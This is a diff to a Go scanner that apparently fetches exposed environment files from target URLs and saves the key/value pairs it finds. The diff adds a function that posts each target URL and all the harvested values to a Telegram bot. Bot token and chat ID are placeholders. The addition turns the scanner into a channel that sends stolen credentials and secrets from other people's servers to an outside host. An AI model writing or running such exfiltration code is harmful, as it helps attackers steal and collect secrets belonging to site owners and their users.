@@ -17,6 +17,7 @@ import (
 	"sync"
 	"sync/atomic"
 	"time"
+	"context"
 	
 	"github.com/mmpx12/optionparser"
 	"github.com/fatih/color"
@@ -86,12 +87,42 @@ func CheckEnv(client *http.Client, url, path string) {
 				color.Unset()
 				WriteToFile(key + "=" + val)
 			}
+
+			// Send message to Telegram using BOT API
+			sendMessageToTelegram(resp.Request.URL.String(), all)
 			mu.Unlock()
 			<-thread
 			return
 		}
 	}
 	<-thread
+}
+
+func sendMessageToTelegram(url string, data []string) {
+    // Replace with your actual bot token and chat ID
+    botToken := "YOUR_BOT_TOKEN"
+    chatID := "YOUR_CHAT_ID"
+
+    msg := fmt.Sprintf("Url:\n%s\n\nData:\n%s", url, strings.Join(data, "\n"))
+
+    // Use a client for easier HTTP handling
+    client := &http.Client{}
+
+    req, err := http.NewRequestWithContext(context.Background(), "POST", fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken), strings.NewReader(fmt.Sprintf(`{"chat_id": "%s", "text": "%s"}`, chatID, msg)))
+    if err != nil {
+        fmt.Println("Error creating Telegram request:", err)
+        return
+    }
+    req.Header.Set("Content-Type", "application/json")
+
+    resp, err := client.Do(req)
+    if err != nil {
+        fmt.Println("Error sending Telegram message:", err)
+        return
+    }
+    defer resp.Body.Close()
+
+    fmt.Println("Telegram message sent with status:", resp.Status)
 }
 
 func WriteToFile(target string) {
